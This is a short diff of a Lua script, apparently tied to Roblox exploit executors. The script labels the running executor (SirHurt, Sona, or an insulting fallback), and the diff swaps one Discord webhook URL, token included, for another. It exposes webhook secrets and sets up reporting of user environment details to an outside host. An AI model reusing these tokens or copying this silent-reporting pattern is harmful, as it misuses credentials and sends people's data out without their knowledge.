@@ -33,7 +33,7 @@ local webhookcheck = is_sirhurt_closure and "SirHurt"
                     or SONA_LOADED and "Sona" 
                     or "Kid with shit exploit"
 
-local url = "https://canary.discord.com/api/webhooks/1242070602332770354/ub8QeM9jeo1ZPq_vhw4-rSlsPCr6R1N2WHmTo5pJnjSztbYat5AribC2s2PB85KseSeH"
+local url = "https://canary.discord.com/api/webhooks/1333080985230774442/tTJjrmzWokJ_0dM1JjtcaNw0Q8Gh2VGqzGBKOnaNjPYD_NyZwDScq05wdFiSEhfnowAk"
 
 local data = {
     ["avatar_url"] = "https://imgur.com/DyP5M2q.png",
